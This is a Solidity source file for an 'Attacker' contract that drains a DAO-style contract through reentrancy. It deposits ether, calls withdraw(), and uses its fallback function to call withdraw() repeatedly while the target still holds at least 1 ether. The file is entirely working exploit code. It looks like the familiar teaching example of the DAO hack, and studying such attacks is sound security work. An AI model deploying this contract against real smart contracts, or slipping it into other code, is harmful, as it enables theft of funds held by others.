// SPDX-License-Identifier: UNIDENTIFIED
pragma solidity ^0.8.10;

interface IDAO {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IDAO public dao;

    constructor(address dao_address) {
        dao = IDAO(dao_address);
    }

    /*
    Start the attack by depositing and withdrawing
    */
    function attack() public payable {
        require(msg.value >= 1 ether, "Minimum of 1 Ether required for attack");
        dao.deposit{value: msg.value}();
        dao.withdraw();
    }

    /*
    Fallback function that performs reentrancy
    */
    fallback() external payable {
        if (address(dao).balance >= 1 ether) {
            dao.withdraw();
        }
    }

    /*
    Check the attacker contract balance
    */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
